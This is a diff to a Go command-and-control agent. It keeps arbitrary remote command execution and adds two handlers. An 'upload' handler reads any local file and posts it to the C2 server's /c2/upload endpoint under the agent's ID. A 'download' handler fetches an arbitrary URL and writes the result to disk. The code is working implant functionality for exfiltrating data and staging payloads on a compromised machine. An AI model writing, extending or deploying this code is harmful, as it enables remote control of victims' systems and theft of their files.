@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"io"
 	"net/http"
 	"os"
 	"os/exec"
@@ -96,17 +97,76 @@ func getTask() (Task, error) {
 
 func executeTask(task Task) string {
 	parts := strings.Split(task.Command, " ")
-	cmd := exec.Command(parts[0], parts[1:]...)
-	var out bytes.Buffer
-	cmd.Stdout = &out
-	cmd.Stderr = &out
+	command := parts[0]
 
-	err := cmd.Run()
+	switch command {
+	case "upload":
+		if len(parts) < 2 {
+			return "Usage: upload <local_file_path>"
+		}
+		return handleUpload(parts[1])
+	case "download":
+		if len(parts) < 3 {
+			return "Usage: download <file_url> <destination_path>"
+		}
+		return handleDownload(parts[1], parts[2])
+	default:
+		cmd := exec.Command(command, parts[1:]...)
+		var out bytes.Buffer
+		cmd.Stdout = &out
+		cmd.Stderr = &out
+
+		err := cmd.Run()
+		if err != nil {
+			return fmt.Sprintf("Error executing command: %s\n%s", err.Error(), out.String())
+		}
+		return out.String()
+	}
+}
+
+func handleUpload(filePath string) string {
+	fileData, err := os.ReadFile(filePath)
 	if err != nil {
-		return fmt.Sprintf("Error executing command: %s\n%s", err.Error(), out.String())
+		return fmt.Sprintf("Could not read file: %s", err.Error())
 	}
 
-	return out.String()
+	url := fmt.Sprintf("%s/c2/upload/%s?file=%s", c2Server, agentID, filePath)
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(fileData))
+	if err != nil {
+		return fmt.Sprintf("Could not create request: %s", err.Error())
+	}
+	req.Header.Set("Content-Type", "application/octet-stream")
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Sprintf("Error uploading file: %s", err.Error())
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == http.StatusOK {
+		return fmt.Sprintf("File '%s' uploaded successfully.", filePath)
+	}
+	return fmt.Sprintf("File upload failed with status: %s", resp.Status)
+}
+
+func handleDownload(fileURL, destPath string) string {
+	resp, err := http.Get(fileURL)
+	if err != nil {
+		return fmt.Sprintf("Error downloading file: %s", err.Error())
+	}
+	defer resp.Body.Close()
+
+	fileData, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Sprintf("Error reading downloaded content: %s", err.Error())
+	}
+
+	if err := os.WriteFile(destPath, fileData, 0644); err != nil {
+		return fmt.Sprintf("Error writing file to destination: %s", err.Error())
+	}
+
+	return fmt.Sprintf("File downloaded from '%s' and saved to '%s'", fileURL, destPath)
 }
 
 func postResult(taskID, result string) error {
